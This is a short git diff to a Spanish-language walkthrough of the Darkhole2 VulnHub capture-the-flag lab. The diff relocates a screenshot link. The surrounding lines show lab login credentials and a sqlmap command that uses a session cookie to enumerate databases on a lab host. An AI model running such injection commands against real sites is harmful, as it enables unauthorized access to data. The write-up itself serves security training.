@@ -75,8 +75,8 @@ Finalmente, descubrimos las credenciales de la página de inicio de sesión desc
 ~~~
 Email: lush@admin.com
 Password: 321
-![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/d28db4ad-c176-4b11-8b0f-98003ef027b2)
 ~~~
+explotación![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/ef3efe47-cf8f-408d-9592-e9b5248d0b82)
 
 sqlmap -u "http://192.168.40.133/dashboard.php?id=1" --cookie="coiafrua9mc461a8436it7eiu4" --dbs –batch   //vemos las bases de datos
 
